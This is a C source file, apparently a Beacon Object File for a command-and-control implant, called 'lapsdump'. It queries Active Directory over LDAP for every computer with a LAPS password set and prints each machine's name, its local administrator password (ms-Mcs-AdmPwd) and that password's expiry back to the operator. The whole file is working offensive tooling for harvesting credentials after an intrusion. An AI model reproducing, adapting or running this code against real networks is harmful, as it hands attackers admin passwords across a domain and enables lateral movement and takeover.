/*
 * lapsdump - read LAPS passwords (ms-Mcs-AdmPwd) from AD.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"

void go(char *args, int alen)
{
    char base[512];
    LDAP *ld;
    LDAPMessage *res = NULL, *e;
    PCHAR attrs[4];
    ULONG rc;
    int count = 0;

    (void)args; (void)alen;

    ld = bof_ldap_open();
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP connect/bind failed\n");
        return;
    }
    if (bof_ldap_default_nc(ld, base, sizeof(base)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "could not read defaultNamingContext\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    attrs[0] = "cn";
    attrs[1] = "ms-Mcs-AdmPwd";
    attrs[2] = "ms-Mcs-AdmPwdExpirationTime";
    attrs[3] = NULL;

    rc = WLDAP32$ldap_search_ext_sA(ld, base, LDAP_SCOPE_SUBTREE,
            "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))",
            attrs, 0, NULL, NULL, NULL, 1000, &res);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "LAPS search failed: %lu (%s)\n",
                     (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "LAPS passwords\n");
    for (e = WLDAP32$ldap_first_entry(ld, res); e; e = WLDAP32$ldap_next_entry(ld, e)) {
        struct berval **cn = WLDAP32$ldap_get_values_lenA(ld, e, "cn");
        struct berval **pw = WLDAP32$ldap_get_values_lenA(ld, e, "ms-Mcs-AdmPwd");
        struct berval **exp = WLDAP32$ldap_get_values_lenA(ld, e, "ms-Mcs-AdmPwdExpirationTime");

        if (pw && pw[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "  %-32s ",
                         (cn && cn[0]) ? cn[0]->bv_val : "(unnamed)");
            bof_ldap_print_value(pw[0]);
            if (exp && exp[0])
                BeaconPrintf(CALLBACK_OUTPUT, "  (expires %s)", exp[0]->bv_val);
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
            count++;
        }
        if (cn) WLDAP32$ldap_value_free_len(cn);
        if (pw) WLDAP32$ldap_value_free_len(pw);
        if (exp) WLDAP32$ldap_value_free_len(exp);
    }

    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_unbind(ld);
    BeaconPrintf(CALLBACK_OUTPUT, "\nComputers with LAPS: %d\n", count);
}
